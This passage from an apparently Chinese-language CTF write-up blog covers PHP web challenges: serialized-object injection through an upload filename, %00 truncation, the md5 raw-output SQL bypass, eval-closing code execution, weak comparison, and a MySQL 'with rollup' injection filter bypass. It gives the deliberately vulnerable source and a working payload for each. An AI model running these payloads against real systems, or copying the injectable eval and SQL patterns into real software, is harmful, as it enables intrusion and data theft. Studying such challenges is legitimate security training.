class="hljs-comment">//|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</span><br><br></code></pre></td></tr></table></figure><p>打开上传页面 随意上传一个文件并修改文件名为 <code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code> </p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203071655784.png" alt="image-20220307165538635"></p><p>最终exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">修改语句为print_r(file_get_contents(<span class="hljs-string">&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;</span>));<br>output:|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;&#125;<br></code></pre></td></tr></table></figure><p>getFlag</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202203071659832.png" alt="image-20220307165940767"></p><h2 id="PHP-00截断与弱类型"><a href="#PHP-00截断与弱类型" class="headerlink" title="PHP %00截断与弱类型"></a>PHP %00截断与弱类型</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;!--index.phps--&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])<br>&#123;<br>header(<span class="hljs-string">&#x27;Location: index.php?id=1&#x27;</span>);<br><span class="hljs-keyword">exit</span>();<br>&#125;<br><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;.&#x27;</span>))<br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hahahahahaha&#x27;</span>;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-variable">$data</span> = @file_get_contents(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span>==<span class="hljs-string">&quot;1112 is a nice lab!&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$id</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> strlen(<span class="hljs-variable">$b</span>)&gt;<span class="hljs-number">5</span> <span class="hljs-keyword">and</span> eregi(<span class="hljs-string">&quot;111&quot;</span>.substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&quot;1114&quot;</span>) <span class="hljs-keyword">and</span> substr(<span class="hljs-variable">$b</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)!=<span class="hljs-number">4</span>)<br>&#123;<br><span class="hljs-keyword">require</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;work harder!harder!harder!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>一眼截断</p><p>对于 $data 肯定是伪协议即可</p><p>$id 由于比较的时候 采用的 弱比较 所以 只要 传入一个 字符 id&#x3D;a  会转换为 0</p><p>$b这里存在 egeri 可以设置<code>$b</code>为<code>%00111111</code>，这样，<code>substr（）</code>会发生截断，在匹配时时进行<code>eregi(“111”,”1114”)</code>满足，同时<code>%00</code>对<code>strlen</code>不会发生截断</p><p>最终exp</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts">?id=a<span class="hljs-variable">&amp;a</span>=php:<span class="hljs-comment">//input&amp;b=%0011111</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">POST:</span><br><span class="hljs-number">1112</span> is a nice lab!<br></code></pre></td></tr></table></figure><h2 id="PHP-md5-password-true"><a href="#PHP-md5-password-true" class="headerlink" title="PHP md5($password,true)"></a>PHP md5($password,true)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$link</span> = mysql_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$link</span>) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect to MySQL: &#x27;</span> . mysql_error()); <br>&#125; <br><br><span class="hljs-comment">// 选择数据库</span><br><span class="hljs-variable">$db</span> = mysql_select_db(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-variable">$link</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$db</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;select db error&#x27;</span>;<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// 执行sql</span><br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>];<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM admin WHERE pass = &#x27;&quot;</span>.md5(<span class="hljs-variable">$password</span>,<span class="hljs-literal">true</span>).<span class="hljs-string">&quot;&#x27;&quot;</span>;<br>var_dump(<span class="hljs-variable">$sql</span>);<br><span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-variable">$sql</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br><span class="hljs-variable">$row1</span> = mysql_fetch_row(<span class="hljs-variable">$result</span>);<br>var_dump(<span class="hljs-variable">$row1</span>);<br><br>mysql_close(<span class="hljs-variable">$link</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>挺固定的解法</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">pwd</span>=ffifdyop<br></code></pre></td></tr></table></figure><h2 id="PHP-提前闭合RCE-引入外部变量"><a href="#PHP-提前闭合RCE-引入外部变量" class="headerlink" title="PHP 提前闭合RCE || 引入外部变量"></a>PHP 提前闭合RCE || 引入外部变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>error_reporting(<span class="hljs-number">0</span>);<br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$a</span> = @<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hello&#x27;</span>];<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;var_dump(<span class="hljs-subst">$a</span>);&quot;</span>); <br></code></pre></td></tr></table></figure><p>这题好像和我之前看得一个一样</p><p>预期解</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">?hello=);<span class="hljs-keyword">eval</span>(phpinfo());<span class="hljs-comment">//     直接执行命令 </span><br>?hello=);<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[c]&amp;c=phpinfo();    引入新变量<br></code></pre></td></tr></table></figure><p>至于为什么不能直接 system(ls) 大概是 phpdisablefunction限制了吧</p><h2 id="PHP-弱比较知识点杂糅"><a href="#PHP-弱比较知识点杂糅" class="headerlink" title="PHP 弱比较知识点杂糅"></a>PHP 弱比较知识点杂糅</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>show_source(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v2</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$v3</span>=<span class="hljs-number">0</span>;<br><span class="hljs-variable">$a</span>=(<span class="hljs-keyword">array</span>)json_decode(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;foo&#x27;</span>]);<br><span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$a</span>))&#123;<br>   is_numeric(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])&#123;<br>   (<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>]&gt;<span class="hljs-number">2016</span>)?<span class="hljs-variable">$v1</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>   <span class="hljs-keyword">if</span>(is_array(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>]))&#123;<br>   <span class="hljs-keyword">if</span>(count(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>])!==<span class="hljs-number">5</span> <span class="hljs-keyword">OR</span> !is_array(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>][<span class="hljs-number">0</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br>   <span class="hljs-variable">$pos</span> = array_search(<span class="hljs-string">&quot;nudt&quot;</span>, <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;a2&quot;</span>]);<br>   <span class="hljs-variable">$pos</span>===<span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br>   <span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;nudt&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   &#125;<br>   <span class="hljs-variable">$v2</span>=<span class="hljs-number">1</span>;<br>   &#125;<br>&#125;<br><span class="hljs-variable">$c</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br><span class="hljs-variable">$d</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dog&#x27;</span>];<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>])&#123;<br>   <span class="hljs-keyword">if</span>(!strcmp(<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$d</span>) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>]!==<span class="hljs-variable">$d</span>)&#123;<br>   eregi(<span class="hljs-string">&quot;3|1|c&quot;</span>,<span class="hljs-variable">$d</span>.<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   strpos((<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$d</span>), <span class="hljs-string">&quot;htctf2016&quot;</span>)?<span class="hljs-variable">$v3</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v1</span> &amp;&amp; <span class="hljs-variable">$v2</span> &amp;&amp; <span class="hljs-variable">$v3</span>)&#123;<br>   <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>   <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到輸出flag需要滿足 v1&amp;v2&amp;v3&#x3D;1</p><p>拆分條件</p><h3 id="V1"><a href="#V1" class="headerlink" title="V1"></a>V1</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=(<span class="hljs-keyword">array</span>)json_decode(@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;foo&#x27;</span>]);<br><span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$a</span>))&#123;<br>   is_numeric(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   <span class="hljs-keyword">if</span>(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>])&#123;<br>   (<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar1&quot;</span>]&gt;<span class="hljs-number">2016</span>)?<span class="hljs-variable">$v1</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>要求提交的这个数组不能通过is_numeric的检测但是同事时满足 &gt;2016</p><p>由此存在 <code>$a[&quot;bar1&quot;] = 2017a</code></p><h3 id="V2"><a href="#V2" class="headerlink" title="V2"></a>V2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(is_array(@<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>]))&#123;<br><span class="hljs-keyword">if</span>(count(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>])!==<span class="hljs-number">5</span> <span class="hljs-keyword">OR</span> !is_array(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>][<span class="hljs-number">0</span>])) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>);<br><span class="hljs-variable">$pos</span> = array_search(<span class="hljs-string">&quot;nudt&quot;</span>, <span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;a2&quot;</span>]);<br><span class="hljs-variable">$pos</span>===<span class="hljs-literal">false</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span>[<span class="hljs-string">&quot;bar2&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$val</span>)&#123;<br><span class="hljs-variable">$val</span>===<span class="hljs-string">&quot;nudt&quot;</span>?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>&#125;<br><span class="hljs-variable">$v2</span>=<span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来，要求<code>$a[&quot;bar2&quot;]</code>是个数组，其中元素的个数为5个，同时要求<code>$a[&quot;bar2&quot;][0]</code>是数组。所以设置:</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">$a[<span class="hljs-string">&quot;bar2&quot;</span>] = [[],<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]<br></code></pre></td></tr></table></figure><h3 id="V3"><a href="#V3" class="headerlink" title="V3"></a>V3</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$c</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cat&#x27;</span>];<br><span class="hljs-variable">$d</span>=@<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;dog&#x27;</span>];<br><span class="hljs-keyword">if</span>(@<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>])&#123;<br>   <span class="hljs-keyword">if</span>(!strcmp(<span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>],<span class="hljs-variable">$d</span>) &amp;&amp; <span class="hljs-variable">$c</span>[<span class="hljs-number">1</span>]!==<span class="hljs-variable">$d</span>)&#123;<br>   eregi(<span class="hljs-string">&quot;3|1|c&quot;</span>,<span class="hljs-variable">$d</span>.<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>])?<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nope&quot;</span>):<span class="hljs-literal">NULL</span>;<br>   strpos((<span class="hljs-variable">$c</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">$d</span>), <span class="hljs-string">&quot;htctf2016&quot;</span>)?<span class="hljs-variable">$v3</span>=<span class="hljs-number">1</span>:<span class="hljs-literal">NULL</span>;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>​    先会用strcmp进行比较，利用数组array和字符串进行strcmp比较会返回null，而且数组array也不会等于字符串，我们可以设置cat[1]为一个数组。</p><p>接下来用eregi对拼接后的字符串<code>$d.$c[0]</code>进行正则匹配，若匹配到则die掉。而下一步又要求拼接字符串<code>$c[0].$d</code>中要有字符串“htctf2016”。这里利用%00对eregi的截断功能，则在正则匹配eregi时在开头时就匹配结束掉。</p><p><code>strpos(($c[0].$d), &quot;htctf2016&quot;)</code>中，还要求“htctf2016”不能出现在开头。</p><p>所以设置：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">$d = %00 即 dog=%00<br><br>$c[<span class="hljs-number">0</span>]  = <span class="hljs-string">&quot;ahtctf2016&quot;</span><br></code></pre></td></tr></table></figure><p>所以综上所述，构造总的payload如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">218.76.35.75:20114</span>/?foo=&#123;<span class="hljs-string">&quot;bar1&quot;</span>:<span class="hljs-string">&quot;2017e&quot;</span>,<span class="hljs-string">&quot;bar2&quot;</span>:[[],<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>],<span class="hljs-string">&quot;a2&quot;</span>:[<span class="hljs-string">&quot;nudt&quot;</span>]&#125;&amp;cat[<span class="hljs-number">0</span>]=ah<br></code></pre></td></tr></table></figure><p>我擦 copy的有点多 Refer: <a href="https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/">https://chybeta.github.io/2017/08/18/XNUCA-2017-Web%E4%B8%93%E9%A2%98%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC-php%E6%98%AF%E6%9C%80%E5%A5%BD%E7%9A%84%E8%AF%AD%E8%A8%80-writeup/</a></p><h2 id="Mysql-with-rollup注入"><a href="#Mysql-with-rollup注入" class="headerlink" title="Mysql with rollup注入"></a>Mysql with rollup注入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>])) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;input type=&quot;submit&quot; /&gt;&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/form&gt;&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;!--source: source.txt--&gt;&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>    <span class="hljs-keyword">die</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">AttackFilter</span>(<span class="hljs-params"><span class="hljs-variable">$StrKey</span>,<span class="hljs-variable">$StrValue</span>,<span class="hljs-variable">$ArrReq</span></span>)</span>&#123;  <br>    <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$StrValue</span>))&#123;<br>        <span class="hljs-variable">$StrValue</span>=implode(<span class="hljs-variable">$StrValue</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$ArrReq</span>.<span class="hljs-string">&quot;/is&quot;</span>,<span class="hljs-variable">$StrValue</span>)==<span class="hljs-number">1</span>)&#123;   <br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;水可载舟，亦可赛艇！&quot;</span>;<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filter</span> = <span class="hljs-string">&quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)&#123;<br>    AttackFilter(<span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span>,<span class="hljs-variable">$filter</span>);<br>&#125;<br><span class="hljs-variable">$con</span> = mysql_connect(<span class="hljs-string">&quot;XXXXXX&quot;</span>,<span class="hljs-string">&quot;XXXXXX&quot;</span>,<span class="hljs-string">&quot;XXXXXX&quot;</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$con</span>)&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Could not connect: &#x27;</span> . mysql_error());<br>&#125;<br><span class="hljs-variable">$db</span>=<span class="hljs-string">&quot;XXXXXX&quot;</span>;<br>mysql_select_db(<span class="hljs-variable">$db</span>, <span class="hljs-variable">$con</span>);<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM interest WHERE uname = &#x27;<span class="hljs-subst">&#123;$_POST[&#x27;uname&#x27;]&#125;</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$query</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (mysql_num_rows(<span class="hljs-variable">$query</span>) == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-variable">$key</span> = mysql_fetch_array(<span class="hljs-variable">$query</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>] == <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>]) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;CTF&#123;XXXXXX&#125;&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;亦可赛艇！&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;一颗赛艇！&quot;</span>;<br>&#125;<br>mysql_close(<span class="hljs-variable">$con</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>buu搞过了 直接说 使用group by pwd with rollup 来在查询结果后加一行，并且这一行pwd字段的值为NULL</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=&#x27;  or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> group by pwd with rollup limit <span class="hljs-number">1</span> offset <span class="hljs-number">2</span> #&amp;pwd=<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 